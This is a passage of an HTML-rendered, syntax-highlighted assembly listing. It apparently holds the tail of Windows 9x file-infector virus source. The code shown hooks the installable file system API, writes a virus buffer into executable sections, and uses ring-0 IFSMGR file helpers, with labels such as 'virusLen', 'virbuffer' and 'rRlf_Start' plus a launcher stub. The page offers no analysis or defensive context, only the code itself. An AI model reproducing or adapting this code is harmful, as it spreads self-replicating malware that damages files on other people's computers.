                </span><span class="sc6">add</span><span class="sc0">        </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">imgb</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IFSAPI_handler</span><span class="sc4">]</span><span class="sc0">
               
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">        
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">        

                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">        
                </span><span class="sc6">add</span><span class="sc0">        </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">        
                </span><span class="sc6">add</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">        

                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">               
                </span><span class="sc6">lea</span><span class="sc0">        </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">virbuffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IFSAPI_handler</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">        </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">       </span><span class="sc5">fwrite</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">         </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Close_File</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">                
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">               
</span><span class="sc5">skip_sect</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">        </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">        </span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">        </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">process_next</span><span class="sc0">

</span><span class="sc5">Write_Header</span><span class="sc4">:</span><span class="sc0">
               
                </span><span class="sc6">lea</span><span class="sc0">        </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IFSAPI_handler</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">        </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">bytes_to_read</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">       </span><span class="sc5">fwrite</span><span class="sc0">

</span><span class="sc5">Close_File</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">       </span><span class="sc5">fclose</span><span class="sc0">

</span><span class="sc5">RestoreAttrs</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">        </span><span class="sc8">ECX</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">        </span><span class="sc8">ESI</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_FILEATTRIBUTES</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc5">VxDcall</span><span class="sc0">    </span><span class="sc5">IFSMGR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Ring0_FileIO</span><span class="sc0">

</span><span class="sc5">End_IFSAPI_handler</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">        </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">Exit_IFSAPI_handler</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">               

</span><span class="sc5">old_IFSAPI</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">



</span><span class="sc5">access_eax</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">fopen</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2022h</span><span class="sc0">           
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">              
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">              
                </span><span class="sc5">VxDcall</span><span class="sc0">    </span><span class="sc5">IFSMGR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Ring0_FileIO</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">fclose</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IFSAPI_handler</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">
                </span><span class="sc5">VxDcall</span><span class="sc0">    </span><span class="sc5">IFSMGR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Ring0_FileIO</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">fread</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IFSAPI_handler</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_READFILE</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">       </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
                </span><span class="sc5">VxDcall</span><span class="sc0">    </span><span class="sc5">IFSMGR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Ring0_FileIO</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">fwrite</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IFSAPI_handler</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">       </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
                </span><span class="sc5">VxDcall</span><span class="sc0">    </span><span class="sc5">IFSMGR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Ring0_FileIO</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">fuck</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">                        </span><span class="sc2">5000</span><span class="sc0">
</span><span class="sc5">ctr</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">                        </span><span class="sc2">5000</span><span class="sc0">
</span><span class="sc5">virusLen</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">        </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">rRlf_Start</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">bytes_to_read</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">                       </span><span class="sc2">500h</span><span class="sc0">
</span><span class="sc5">path_len</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">                       </span><span class="sc2">300</span><span class="sc0">

</span><span class="sc5">hfile</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">                        </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">imgb</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">                        </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">semafore</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">                        </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">filepath</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">                        </span><span class="sc5">path_len</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">virbuffer</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">                        </span><span class="sc5">virusLen</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">drp</span><span class="sc0">             </span><span class="sc5">DRP</span><span class="sc0">                       </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ilb</span><span class="sc0">             </span><span class="sc5">ILB</span><span class="sc0">                       </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">isp</span><span class="sc0">             </span><span class="sc5">ISP_GET_FRST_NXT_DCB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ior</span><span class="sc0">             </span><span class="sc5">IOR</span><span class="sc0">                       </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">buffer</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">                        </span><span class="sc5">bytes_to_read</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc5">virpages</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">        </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">rRlf_Start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4095</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">rRlf_Start</span><span class="sc0">
</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">ExitProcess</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span></div></body>
</html>
